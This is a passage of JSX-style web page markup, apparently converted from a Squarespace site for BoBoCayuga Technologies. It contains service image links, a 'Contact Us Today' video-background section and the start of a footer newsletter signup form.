https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="fluidImageOverlay" />
                                    </a>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-81f7301ec16a01f5aa65 .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-86826a3ced55da69adb7"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-86826a3ced55da69adb7"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <p style={{textAlign: 'center', whiteSpace: 'pre-wrap'}} className><a href="services.php"><span className="sqsrte-text-color--black"><strong>Cloud Implementations &amp; Data Migrations</strong></span></a></p>
                              </div>
                            </div></div></div><div className="fe-block fe-block-d3eba8588cbf3d9195ac"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-block-type={5} id="block-d3eba8588cbf3d9195ac"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', position: 'relative', width: '100%', height: '100%'}}>
                                    <a className="sqs-block-image-link content-fit" href="services.php">
                                      <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png" data-image-dimensions="1000x1000" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png" width={1000} height={1000} sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 16.666666666666664vw" style={{display: 'block', objectFit: 'contain', objectPosition: '50% 50%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b6004fe8-effb-4cb0-ac4c-ba3f6b618e5f/BoBoCayuga-Technologies-services-data-governance-and-security.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="fluidImageOverlay" />
                                    </a>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-d3eba8588cbf3d9195ac .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-eac475163f3570f06ad1"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-eac475163f3570f06ad1"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <p style={{textAlign: 'center', whiteSpace: 'pre-wrap'}} className><a href="services.php"><span className="sqsrte-text-color--black"><strong>Data Governance &amp; Security</strong></span></a></p>
                              </div>
                            </div></div></div><div className="fe-block fe-block-yui_3_17_2_1_1694982497794_26211"><div className="sqs-block button-block sqs-block-button sqs-stretched" data-block-type={53} id="block-yui_3_17_2_1_1694982497794_26211"><div className="sqs-block-content">
                              <div className="sqs-block-button-container sqs-block-button-container--center" data-animation-role="button" data-alignment="center" data-button-size="medium" data-button-type="primary">
                                <a href="services.php" className="sqs-block-button-element--medium sqs-button-element--primary sqs-block-button-element">
                                  Learn more
                                </a>
                              </div>
                            </div></div></div></div></div>
                  </div>
                </div>
              </section>
              <section data-test="page-section" data-section-theme="black" className="page-section has-section-divider
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      
        section-height--custom
      
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
    
    black" data-section-id="6508b2c7e5b75c53216a8cfc" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
&quot;customSectionHeight&quot;: 0,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;backgroundColor&quot;: &quot;&quot;,
&quot;sectionTheme&quot;: &quot;black&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;video&quot;
}" data-current-context="{
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 6,
&quot;filterStrength&quot;: 55,
&quot;zoom&quot;: 0,
&quot;videoSourceProvider&quot;: &quot;native&quot;,
&quot;nativeVideoContentItem&quot;: {
&quot;id&quot;: &quot;6508b2c7e5b75c53216a8cf9&quot;,
&quot;recordType&quot;: 61,
&quot;addedOn&quot;: 1695068626907,
&quot;updatedOn&quot;: 1695068626907,
&quot;starred&quot;: false,
&quot;passthrough&quot;: false,
&quot;workflowState&quot;: 1,
&quot;publishOn&quot;: 1695068712534,
&quot;authorId&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;systemDataId&quot;: &quot;4779a7c5-0b5e-4c2f-aeda-9310675bd8f1&quot;,
&quot;systemDataVariants&quot;: &quot;1920:1080,640:360&quot;,
&quot;systemDataSourceType&quot;: &quot;mp4&quot;,
&quot;filename&quot;: &quot;GettyImages-1393020318.mov&quot;,
&quot;body&quot;: null,
&quot;likeCount&quot;: 0,
&quot;commentCount&quot;: 0,
&quot;publicCommentCount&quot;: 0,
&quot;commentState&quot;: 1,
&quot;unsaved&quot;: false,
&quot;author&quot;: {
&quot;id&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;displayName&quot;: &quot;Samantha Hickey&quot;,
&quot;firstName&quot;: &quot;Samantha&quot;,
&quot;lastName&quot;: &quot;Hickey&quot;,
&quot;avatarUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;,
&quot;websiteUrl&quot;: &quot;http://www.bluecoralcreative.com&quot;,
&quot;bio&quot;: &quot;&quot;,
&quot;avatarAssetUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;
},
&quot;contentType&quot;: &quot;video/mp4&quot;,
&quot;structuredContent&quot;: {
&quot;_type&quot;: &quot;SqspHostedVideo&quot;,
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/4779a7c5-0b5e-4c2f-aeda-9310675bd8f1/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333
},
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/4779a7c5-0b5e-4c2f-aeda-9310675bd8f1/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333,
&quot;items&quot;: [ ],
&quot;pushedServices&quot;: { },
&quot;pendingPushedServices&quot;: { },
&quot;usageId&quot;: &quot;c785d060-38e9-3c49-abe1-ded185e9322a&quot;,
&quot;recordTypeLabel&quot;: &quot;sqsp-hosted-video&quot;,
&quot;originalSize&quot;: &quot;1920:1080&quot;
}
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;none&quot;
},
&quot;divider&quot;: {
&quot;enabled&quot;: true,
&quot;type&quot;: &quot;wavy&quot;,
&quot;width&quot;: {
&quot;unit&quot;: &quot;vw&quot;,
&quot;value&quot;: 120.0
},
&quot;height&quot;: {
&quot;unit&quot;: &quot;vw&quot;,
&quot;value&quot;: 3.0
},
&quot;isFlipX&quot;: false,
&quot;isFlipY&quot;: false,
&quot;offset&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;stroke&quot;: {
&quot;style&quot;: &quot;none&quot;,
&quot;color&quot;: {
&quot;type&quot;: &quot;THEME_COLOR&quot;
},
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 6.0
},
&quot;dashLength&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 5.0
},
&quot;gapLength&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 15.0
},
&quot;linecap&quot;: &quot;square&quot;
}
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation="none" data-fluid-engine-section>
                <div className="section-border" data-controller="SectionDivider" style={{clipPath: 'url(#section-divider-6508b2c7e5b75c53216a8cfc)'}}>
                  <div className="section-background">
                    <div data-controller="VideoBackgroundNative">
                      <div className="sqs-video-background-native content-fill" data-config-native-video="{
&quot;id&quot;: &quot;6508b2c7e5b75c53216a8cf9&quot;,
&quot;recordType&quot;: 61,
&quot;addedOn&quot;: 1695068626907,
&quot;updatedOn&quot;: 1695068626907,
&quot;starred&quot;: false,
&quot;passthrough&quot;: false,
&quot;workflowState&quot;: 1,
&quot;publishOn&quot;: 1695068712534,
&quot;authorId&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;systemDataId&quot;: &quot;4779a7c5-0b5e-4c2f-aeda-9310675bd8f1&quot;,
&quot;systemDataVariants&quot;: &quot;1920:1080,640:360&quot;,
&quot;systemDataSourceType&quot;: &quot;mp4&quot;,
&quot;filename&quot;: &quot;GettyImages-1393020318.mov&quot;,
&quot;body&quot;: null,
&quot;likeCount&quot;: 0,
&quot;commentCount&quot;: 0,
&quot;publicCommentCount&quot;: 0,
&quot;commentState&quot;: 1,
&quot;unsaved&quot;: false,
&quot;author&quot;: {
&quot;id&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;displayName&quot;: &quot;Samantha Hickey&quot;,
&quot;firstName&quot;: &quot;Samantha&quot;,
&quot;lastName&quot;: &quot;Hickey&quot;,
&quot;avatarUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;,
&quot;websiteUrl&quot;: &quot;http://www.bluecoralcreative.com&quot;,
&quot;bio&quot;: &quot;&quot;,
&quot;avatarAssetUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;
},
&quot;contentType&quot;: &quot;video/mp4&quot;,
&quot;structuredContent&quot;: {
&quot;_type&quot;: &quot;SqspHostedVideo&quot;,
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/4779a7c5-0b5e-4c2f-aeda-9310675bd8f1/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333
},
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/4779a7c5-0b5e-4c2f-aeda-9310675bd8f1/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333,
&quot;items&quot;: [ ],
&quot;pushedServices&quot;: { },
&quot;pendingPushedServices&quot;: { },
&quot;usageId&quot;: &quot;c785d060-38e9-3c49-abe1-ded185e9322a&quot;,
&quot;recordTypeLabel&quot;: &quot;sqsp-hosted-video&quot;,
&quot;originalSize&quot;: &quot;1920:1080&quot;
}" data-config-playback-speed="0.5" data-config-filter={6} data-config-filter-strength={55}>
                        <div className="sqs-video-background-native__video-player" />
                      </div>
                    </div>
                  </div>
                </div>
                <div className="content-wrapper" style={{paddingTop: 'calc(0vmax / 10)', paddingBottom: 'calc(0vmax / 10)'}}>
                  <div className="content">
                    <div data-fluid-engine="true"><style dangerouslySetInnerHTML={{__html: ".fe-6508b2c7e5b75c53216a8cfb {\n  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 29.0px);\n  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (29.0px * (8 - 1)) ) / 8 );\n\n  display: grid;\n  position: relative;\n  grid-area: 1/1/-1/-1;\n  grid-template-rows: repeat(8,minmax(24px, auto));\n  grid-template-columns:\n    minmax(var(--grid-gutter), 1fr)\n    repeat(8, minmax(0, var(--cell-max-width)))\n    minmax(var(--grid-gutter), 1fr);\n  row-gap: 11.0px;\n  column-gap: 29.0px;\n}\n\n@media (min-width: 768px) {\n  .background-width--inset .fe-6508b2c7e5b75c53216a8cfb {\n    --inset-padding: calc(var(--sqs-site-gutter) * 2);\n  }\n\n  .fe-6508b2c7e5b75c53216a8cfb {\n    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 29.0px);\n    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (29.0px * (24 - 1)) ) / 24 );\n    --inset-padding: 0vw;\n\n    --row-height-scaling-factor: 0.0215;\n    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));\n\n    grid-template-rows: repeat(7,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));\n    grid-template-columns:\n      minmax(var(--grid-gutter), 1fr)\n      repeat(24, minmax(0, var(--cell-max-width)))\n      minmax(var(--grid-gutter), 1fr);\n  }\n}\n\n\n  .fe-block-221c36f5bb7b06184d2b {\n    grid-area: 2/2/5/10;\n    z-index: 1;\n  }\n\n  .fe-block-221c36f5bb7b06184d2b .sqs-block {\n    justify-content: flex-end;\n  }\n\n  .fe-block-221c36f5bb7b06184d2b .sqs-block-alignment-wrapper {\n    align-items: flex-end;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-221c36f5bb7b06184d2b {\n      grid-area: 4/7/6/17;\n      z-index: 1;\n    }\n\n    .fe-block-221c36f5bb7b06184d2b .sqs-block {\n      justify-content: flex-end;\n    }\n\n    .fe-block-221c36f5bb7b06184d2b .sqs-block-alignment-wrapper {\n      align-items: flex-end;\n    }\n  }\n\n  .fe-block-bd764c39ad69e98f082f {\n    grid-area: 5/5/7/10;\n    z-index: 2;\n  }\n\n  .fe-block-bd764c39ad69e98f082f .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-bd764c39ad69e98f082f .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-bd764c39ad69e98f082f {\n      grid-area: 4/17/6/21;\n      z-index: 2;\n    }\n\n    .fe-block-bd764c39ad69e98f082f .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-bd764c39ad69e98f082f .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n" }} /><div className="fluid-engine fe-6508b2c7e5b75c53216a8cfb"><div className="fe-block fe-block-221c36f5bb7b06184d2b"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-221c36f5bb7b06184d2b"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <h2 style={{textAlign: 'right', whiteSpace: 'pre-wrap'}}>Contact Us Today</h2>
                              </div>
                            </div></div></div><div className="fe-block fe-block-bd764c39ad69e98f082f"><div className="sqs-block button-block sqs-block-button sqs-stretched" data-block-type={53} id="block-bd764c39ad69e98f082f"><div className="sqs-block-content">
                              <div className="sqs-block-button-container sqs-block-button-container--center" data-animation-role="button" data-alignment="center" data-button-size="medium" data-button-type="primary">
                                <a href="contact.php" className="sqs-block-button-element--medium sqs-button-element--primary sqs-block-button-element">
                                  Get Started
                                </a>
                              </div>
                            </div></div></div></div></div>
                  </div>
                </div>
                <div className="section-divider-display" style={{-strokeThickness: 0, -strokeDasharray: 0, -strokeLinecap: 'square'}}>
                  <style dangerouslySetInnerHTML={{__html: ".has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"] {\n      padding-bottom: var(--divider-height);\n      z-index: var(--z-index);\n    }\n\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"] .background-pause-button {\n      bottom: calc(14px + var(--divider-height));\n    }\n\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"] .section-divider-svg-clip {\n      display: block;\n    }\n\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"].background-width--inset:not(.content-collection):not(.gallery-section):not(.user-items-list-section) {\n      padding-bottom: calc(var(--sqs-site-gutter) + var(--divider-height));\n    }\n\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"].background-width--inset:not(.content-collection):not(.gallery-section):not(.user-items-list-section) .section-background {\n      bottom: calc(var(--sqs-site-gutter) + var(--divider-height));\n    }\n\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"] .section-divider-block {\n      height: var(--divider-height);\n    }\n  " }} />
                  <style data-section-divider-style dangerouslySetInnerHTML={{__html: ".has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"] {\n      padding-bottom: 3vw;\n    }\n    .has-section-divider[data-section-id=\"6508b2c7e5b75c53216a8cfc\"].background-width--inset:not(.content-collection):not(.gallery-section):not(.user-items-list-section) {\n      padding-bottom: calc(var(--sqs-site-gutter) + 3vw);\n    }\n  " }} />
                  <div className="section-divider-block" />
                  <svg className="section-divider-svg-clip">
                    <clipPath id="section-divider-6508b2c7e5b75c53216a8cfc" clipPathUnits="objectBoundingBox">
                      <path className="section-divider-clip" d="M0,0" />
                    </clipPath>
                  </svg>
                  <svg className="section-divider-svg-stroke" viewBox="0 0 1 1" preserveAspectRatio="none">
                    <path className="section-divider-stroke" d="M0,0" vectorEffect="non-scaling-stroke" />
                  </svg>
                </div>
              </section>
            </article>
          </main>
          <footer className="sections" id="footer-sections" data-footer-sections>
            <section data-test="page-section" data-section-theme="bright" className="page-section 
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      
        section-height--custom
      
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    bright" data-section-id="64f0eb8c29db7413507f3848" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
&quot;customSectionHeight&quot;: 0,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;bright&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-current-context="{
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0,
&quot;videoSourceProvider&quot;: &quot;none&quot;
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;none&quot;
},
&quot;divider&quot;: {
&quot;enabled&quot;: false
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation="none" data-fluid-engine-section>
              <div className="section-border">
                <div className="section-background">
                </div>
              </div>
              <div className="content-wrapper" style={{paddingTop: 'calc(0vmax / 10)', paddingBottom: 'calc(0vmax / 10)'}}>
                <div className="content">
                  <div data-fluid-engine="true"><style dangerouslySetInnerHTML={{__html: ".fe-64f0eb8c29db7413507f3847 {\n  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 0.0px);\n  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (8 - 1)) ) / 8 );\n\n  display: grid;\n  position: relative;\n  grid-area: 1/1/-1/-1;\n  grid-template-rows: repeat(21,minmax(24px, auto));\n  grid-template-columns:\n    minmax(var(--grid-gutter), 1fr)\n    repeat(8, minmax(0, var(--cell-max-width)))\n    minmax(var(--grid-gutter), 1fr);\n  row-gap: 0.0px;\n  column-gap: 0.0px;\n}\n\n@media (min-width: 768px) {\n  .background-width--inset .fe-64f0eb8c29db7413507f3847 {\n    --inset-padding: calc(var(--sqs-site-gutter) * 2);\n  }\n\n  .fe-64f0eb8c29db7413507f3847 {\n    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 0.0px);\n    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (24 - 1)) ) / 24 );\n    --inset-padding: 0vw;\n\n    --row-height-scaling-factor: 0.0215;\n    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));\n\n    grid-template-rows: repeat(8,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));\n    grid-template-columns:\n      minmax(var(--grid-gutter), 1fr)\n      repeat(24, minmax(0, var(--cell-max-width)))\n      minmax(var(--grid-gutter), 1fr);\n  }\n}\n\n\n  .fe-block-yui_3_17_2_1_1693506948954_39526 {\n    grid-area: 8/2/22/10;\n    z-index: 3;\n  }\n\n  .fe-block-yui_3_17_2_1_1693506948954_39526 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-yui_3_17_2_1_1693506948954_39526 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1693506948954_39526 {\n      grid-area: 1/14/9/26;\n      z-index: 4;\n    }\n\n    .fe-block-yui_3_17_2_1_1693506948954_39526 .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-yui_3_17_2_1_1693506948954_39526 .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-bdf639828890a427385b {\n    grid-area: 2/2/10/6;\n    z-index: 1;\n  }\n\n  .fe-block-bdf639828890a427385b .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-bdf639828890a427385b .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-bdf639828890a427385b {\n      grid-area: 2/2/8/7;\n      z-index: 1;\n    }\n\n    .fe-block-bdf639828890a427385b .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-bdf639828890a427385b .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n" }} /><div className="fluid-engine fe-64f0eb8c29db7413507f3847"><div className="fe-block fe-block-yui_3_17_2_1_1693506948954_39526"><div className="sqs-block newsletter-block sqs-block-newsletter" data-block-type={51} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-yui_3_17_2_1_1693506948954_39526"><div className="sqs-block-content">
                            <div className="newsletter-form-wrapper
  
  newsletter-form-wrapper--layoutFloat
  newsletter-form-wrapper--alignLeft
  
  ">
                              <form className="newsletter-form" data-form-id="64f0f2fb5892cb16f412b723" autoComplete="on" method="POST" noValidate onsubmit="return (function (form) {
    Y.use('squarespace-form-submit', 'node', function usingFormSubmit(Y) {
      (new Y.Squarespace.FormSubmit(form)).submit({
        formId: '64f0f2fb5892cb16f412b723',
        collectionId: '64ee27d3af3abd7bf1795408',
        objectName: 'yui_3_17_2_1_1693506948954_39526'
      });
    });
    return false;
  })(this);">
                                <header className="newsletter-form-header">
                                  <div className="newsletter-form-header-description"><p className data-rte-preserve-empty="true" style={{whiteSpace: 'pre-wrap'}} /></div>
                                </header>
                                <div className="newsletter-form-body">
                                  <div className="newsletter-form-fields-wrapper form-fields" style={{verticalAlign: 'middle'}}>
                                    <div id="email-yui_3_17_2_1_1693512278960_4078" className="newsletter-form-field-wrapper form-item field email required" style={{verticalAlign: 'bottom'}}>
                                      <label className="newsletter-form-field-label title" htmlFor="email-yui_3_17_2_1_1693512278960_4078-field">Email Address</label>
                                      <input id="email-yui_3_17_2_1_1693512278960_4078-field" className="newsletter-form-field-element field-element" name="email" x-autocompletetype="email" autoComplete="email" type="email" spellCheck="false" placeholder="Email Address" />
                                    </div>
                                  </div>
                                  <div data-animation-role="button" className="newsletter-form-button-wrapper submit-wrapper" style={{verticalAlign: 'middle'}}>
                                    <button className="
            newsletter-form-button
            sqs-system-button
            sqs-editable-button-layout
            sqs-editable-button-style
            sqs-editable-button-shape
            sqs-button-element--primary
